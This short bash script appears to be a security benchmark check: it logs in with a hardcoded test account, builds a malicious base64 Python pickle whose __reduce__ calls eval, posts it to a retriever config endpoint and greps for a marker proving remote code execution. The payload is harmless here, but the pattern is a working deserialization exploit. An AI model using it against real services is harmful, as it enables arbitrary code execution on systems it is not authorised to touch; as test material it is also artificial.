#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
P=$(python3 - <<'PY'
import base64,pickle
class R:
    def __reduce__(self):
        return (eval,("'PICKLE-RCE-OK'",))
print(base64.b64encode(pickle.dumps(R())).decode())
PY
)
auth_json -X POST "$TARGET/api/retriever/config" -d "{\"pickle_b64\":\"$P\"}" | grep -q 'PICKLE-RCE-OK'
